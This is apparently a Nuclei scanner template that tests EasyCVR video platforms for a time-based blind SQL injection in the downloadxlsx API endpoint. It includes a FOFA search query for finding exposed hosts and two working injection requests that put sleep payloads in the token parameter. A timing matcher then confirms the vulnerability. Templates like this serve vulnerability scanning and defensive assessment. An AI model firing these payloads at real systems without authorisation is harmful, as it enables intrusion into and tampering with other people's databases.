id: easycvr-downloadxlsx-sqli
info:
  name: "EasyCVR 视频管理平台 downloadxlsx 接口 SQL 注入"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: (body="EasyGBS" || body="EasyDarwin.Body" || body="EasyCVR") && (title="" || title="EasyCVR")
      reference: 通过构造恶意输入参数，攻击者可利用该接口执行任意SQL代码，可能导致数据库敏感信息泄露或操作被篡改。该漏洞源于对用户输入未实施充分的过滤与验证机制。
  tags: EasyCVR
http:
  - raw:
    - |
      GET /api/v1/cascade/downloadxlsx?token='and(select*from(select/**/sleep(5))a/**/union/**/select+1)=' HTTP/1.1
      Host: {{Hostname}}
      Accept-Encoding: gzip
      Connection: keep-alive
    - |
      GET /api/v1/cascade/downloadxlsx?token='and(select*from(select/**/sleep(8))a/**/union/**/select+1)=' HTTP/1.1
      Host: {{Hostname}}
      Accept-Encoding: gzip
      Connection: keep-alive
    matchers:
    - type: dsl
      dsl:
      - duration_1>=5 && duration_1<=6
      - duration_2>=8 && duration_2<=9
      condition: and
